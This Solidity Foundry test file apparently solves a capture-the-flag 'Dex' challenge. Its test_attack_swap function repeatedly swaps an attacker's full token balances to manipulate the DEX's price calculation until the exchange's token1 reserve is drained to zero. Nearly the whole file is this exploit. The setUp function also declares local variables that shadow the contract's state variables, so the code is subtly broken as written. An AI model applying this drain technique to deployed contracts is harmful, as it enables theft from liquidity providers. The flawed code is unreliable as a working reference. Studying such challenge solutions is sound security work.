// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;
import "lib/openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";

import {Test, console} from "forge-std/Test.sol";
import {Dex, SwappableToken} from "../src/Dex.sol";

contract TestDex is Test {
    address public immutable ATTACKER = makeAddr("attacker");
    Dex public dex;
    address public token1;
    address public token2;

    function setUp() public {
        Dex dex = new Dex();

        // Deploy two SwappableToken contracts with initial supply
        SwappableToken token1 = new SwappableToken(
            address(dex),
            "Token 1",
            "T1",
            110 ether
        );

        SwappableToken token2 = new SwappableToken(
            address(dex),
            "Token 2",
            "T2",
            110 ether
        );

        // Set tokens for the Dex contract
        dex.setTokens(address(token1), address(token2));

        // Transfer initial liquidity to Dex contract
        token1.transfer(address(dex), 100 ether);
        token2.transfer(address(dex), 100 ether);
        token1.transfer(ATTACKER, 10 ether);
        token2.transfer(ATTACKER, 10 ether);
    }
    function test_initialize_state() public view {
        assertEq(dex.balanceOf(token1, address(dex)), 100 ether);
        assertEq(dex.balanceOf(token2, address(dex)), 100 ether);
        assertEq(dex.balanceOf(token1, ATTACKER), 10 ether);
        assertEq(dex.balanceOf(token2, ATTACKER), 10 ether);
    }
    function test_attack_swap() public {
        for (uint256 i = 0; i < 2; i++) {
            console.log("Iteration:", i);
            swap_all_tokens_1();
            swap_all_tokens_2();
        }
        console.log("final iteration");
        swap_all_tokens_1();
        vm.prank(ATTACKER);
        dex.approve(address(dex), 110 ether);
        uint256 amountToSwap = dex.balanceOf(token2, address(dex));
        vm.prank(ATTACKER);
        dex.swap(token2, token1, amountToSwap);
        console.log("final swap");

        console.log("balance of token 1", dex.balanceOf(token1, ATTACKER));
        console.log("balance of token 2", dex.balanceOf(token2, ATTACKER));
        console.log(
            "balance of token 1 dex",
            dex.balanceOf(token1, address(dex))
        );
        console.log(
            "balance of token 2 dex ",
            dex.balanceOf(token2, address(dex))
        );
        assertEq(dex.balanceOf(token1, address(dex)), 0);
    }
    function swap_all_tokens_1() public {
        vm.prank(ATTACKER);
        dex.approve(address(dex), 110 ether);
        uint256 balanceOfToken1 = dex.balanceOf(token1, ATTACKER);
        vm.prank(ATTACKER);
        dex.swap(token1, token2, balanceOfToken1);
        console.log("swap all tokens 1");
        console.log("balance of token 1", dex.balanceOf(token1, ATTACKER));
        console.log("balance of token 2", dex.balanceOf(token2, ATTACKER));
    }
    function swap_all_tokens_2() public {
        vm.prank(ATTACKER);
        dex.approve(address(dex), 110 ether);
        uint256 balanceOfToken2 = dex.balanceOf(token2, ATTACKER);
        vm.prank(ATTACKER);
        dex.swap(token2, token1, balanceOfToken2);
        console.log("swap all tokens 2");
        console.log("balance of token 1", dex.balanceOf(token1, ATTACKER));
        console.log("balance of token 2", dex.balanceOf(token2, ATTACKER));
    }
}
